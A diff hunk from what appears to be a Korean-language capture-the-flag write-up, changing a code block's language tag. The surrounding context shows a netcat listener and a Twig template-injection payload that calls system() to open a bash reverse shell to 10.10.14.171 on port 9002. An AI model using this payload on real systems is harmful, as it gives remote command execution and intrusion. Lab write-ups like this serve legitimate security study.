@@ -347,7 +347,7 @@ $ nc -lvnp 9002
 
 그 후, `index.twig` 템플릿 파일로 돌아가 아래 리버스 셸 페이로드를 삽입하였다:
 
-```text
+```bash
 {{["bash -c 'bash -i >& /dev/tcp/10.10.14.171/9002 0>&1'"]|filter('system')}}
 ```
 
